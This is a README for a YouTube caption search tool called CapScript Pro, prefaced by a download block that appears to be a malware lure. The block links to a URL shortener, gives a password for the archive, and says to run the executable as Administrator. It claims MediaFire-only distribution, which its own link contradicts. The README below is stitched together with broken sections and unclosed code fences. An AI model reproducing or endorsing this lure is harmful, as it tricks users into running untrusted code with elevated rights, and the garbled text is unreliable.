<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# YouTube Bulk Caption Search Tool 

<div align="center">

## Overview

CapScript Pro searches YouTube captions at scale and turns the results into usable media — clips, rendered videos, and reusable video-ID lists. It ships as a native Qt/C++ desktop app for Windows, backed by an embedded Python engine, plus a standalone CLI for headless or automated workflows.

**Typical workflow:**

1. Search for a keyword across a channel or a list of videos.
2. Review exact timestamp matches in the built-in transcript viewer.
3. Extract clips at the matched moments.
4. Render clips into a single output video via FFmpeg.
5. Save reusable video-ID lists for future searches.

## Features

| Page | What it does |
|---|---|
| **Search** | Query by video or channel, with proxy support, cookie-based auth, and language selection |
| **Viewer** | Browse transcripts with clickable timestamps and in-app playback; import/export transcripts |
| **Clip Downloader** | Pull clips from matched timestamps in mp4, mkv, webm, or mp3, with quality controls |
| **Renderer** | Merge clips into a final video via FFmpeg, with control over format, resolution, frame rate, and CRF |
| **List Creator** | Build video-ID lists from a channel by date range or keyword, with thumbnail previews |
| **Updater** | Built-in update checker that stages new releases automatically |

## Architecture

The UI is native Qt/C++; YouTube-facing logic runs in an embedded Python runtime.

1. The app resolves Python runtime paths relative to the executable.
2. `PythonBridge` initializes an embedded interpreter with scoped module search paths.
3. C++ calls into Python for channel resolution, transcript search, and proxy/credential storage.
4. Progress streams back to C++ via callback trampolines and updates the UI (or CLI output) live.

This keeps the interface fast and native while reusing the Python/yt-dlp ecosystem for the parts that need it.

## Tech Stack

**Desktop app**
- C++17, Qt 6 (Core, Gui, Widgets, Network, Concurrent, Svg)
- Optional: Multimedia/MultimediaWidgets, Quick/Qml/QuickWidgets/WebView/WebViewQuick
- Embedded Python 3 interpreter
- WebView2 runtime (optional, enables the in-app player)

**Python engine / CLI** — see `python/requirements.txt`
- yt-dlp, cryptography, rich

**External tools** (required for clip/render features) — resolved from `app/bin/`, the app root, or system `PATH`
- yt-dlp, ffmpeg, ffprobe

**Optional**
- A Cloudflare Worker (TypeScript) handles feedback delivery and rate limiting.

## Project Structure

```
.github/workflows/                 CI workflows
assets/
├── fonts/                         Bundled fonts (+ licenses)
├── icons/                         App icons
└── qml/                           QML resources for web player integration
cloudflare-worker/
└── capscript-feedback-worker/     Optional feedback backend (TypeScript)
docs/                              Web documentation assets
python/                            capscript_engine.py, cli.py, requirements.txt
scripts/                           Build utilities, incl. the embedded runtime bundler
src/
├── app/                           Application entry point
├── core/                          Python bridge, settings, updater, URL handling
├── ui/
│   ├── pages/                     Search, Viewer, Clip Downloader, Renderer, List Creator, About
│   ├── styles/                    Theming (ThemeManager)
│   └── widgets/                   Reusable UI widgets
├── updater/                       Standalone updater executable
└── workers/                       Background threads for search, clip, and render jobs
third_party/
├── phantomstyle/                  Vendored Qt style (src/phantom, src/styleplugin)
└── webview2/sdk/                  WebView2 SDK headers and native libs
CMakeLists.txt
CapScriptPro.rc
CapScriptUpdater.rc
LICENSE
```

## Installation

CapScript Pro can be used two ways: the **GUI app** (Windows only, no setup) or the **CLI** (cross-platform-friendly, requires Python).

### Option 2: CLI (for automation / headless use)

```powershell
## Building from Source

### Prerequisites

- Windows 10/11
- CMake 3.21+
- Qt 6 (matching your compiler toolchain)
- Python 3 with headers/libs discoverable by CMake
- WebView2 runtime (optional, recommended)
- yt-dlp and ffmpeg on `PATH` (optional, needed for clip/render features)

### Build

```powershell
cmake -S . -B build -G "Visual Studio 17 2022" -A x64
cmake --build build --config Release
```

The build output includes the app executable alongside a bundled `python/` runtime — no additional setup needed to run it.

### Bundling Python for distribution

To package an embeddable Python runtime with dependencies manually:

```powershell
python scripts/bundle_python.py 3.11.9 .\python .\python\requirements.txt
```

## CLI Reference

The Python CLI (`python/cli.py`) covers automation, headless environments, and quick one-off searches without launching the GUI.

### Setup

```powershell
cd python
python -m pip install -r requirements.txt
```

Recommended: Python 3.10+.

### Authentication

No API key is needed — everything runs through yt-dlp. For age-restricted or private content, pass cookies directly from your browser:

```powershell
--cookies-from-browser chrome|firefox|edge|brave
```

Legacy API-key flags are still accepted as no-ops, for compatibility with older scripts.

### Usage

```powershell
python cli.py --search-type channel --channel "@mkbhd" --keyword "sponsors" --max-results 20
```

**Required**
- `--search-type` — `channel` or `video`
- `--keyword` — search term
- `--channel` (channel mode) or `--video-ids` (video mode)

**Common options**
- `--language en`
- `--output-dir transcripts`
- `--cookies FILE` / `--cookies-from-browser chrome|firefox|edge|brave`
- `--proxy-type`, `--proxy-username`, `--proxy-password`, `--proxy-url`
- `--save-proxy`, `--clear-proxy`

### Examples

```powershell
# Search a channel by handle
python cli.py --search-type channel --channel "@mkbhd" --keyword "sponsors" --max-results 20

# Use browser cookies
python cli.py --search-type channel --channel "@mkbhd" --keyword "AI" --cookies-from-browser chrome

# Webshare proxy + cookies file
python cli.py --search-type channel --channel "UCxxxxxx" --keyword "AI" --proxy-type webshare --proxy-username USER --proxy-password PASS --cookies cookies.txt

## Troubleshooting

| Symptom | Fix |
|---|---|
| Python engine fails to initialize | Confirm `python/` exists next to the executable with `Lib`, the Python zip, and required modules |
| No transcript results | Try `--cookies-from-browser` or a `cookies.txt`, and confirm the language code exists for that video |
| Clip download/render fails | Verify yt-dlp and ffmpeg are installed and discoverable; check app logs for tool-path errors |
| Rate limiting / access errors | Pass browser cookies via `--cookies-from-browser`, reduce concurrent activity, and retry |

## License

MIT License + Commons Clause v1.0.

## Screenshots

<p align="center">


---

MIT License

Copyright (c) 2026 ~serptail

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Commons Clause License Condition v1.0

The Software is provided to you by the Licensor under the License, as defined
below, subject to the following condition.

Without limiting other conditions in the License, the grant of rights under the
License will not include, and the License does not grant to you, the right to
Sell the Software.

For purposes of the foregoing, “Sell” means practicing any or all of the
rights granted to you under the License to provide to third parties, for a fee
or other consideration (including without limitation fees for hosting or
consulting/ support services related to the Software), a product or service
whose value derives, entirely or substantially, from the functionality of the
Software. Any license notice or attribution required by the License must also
include this Commons Clause License Condition notice.
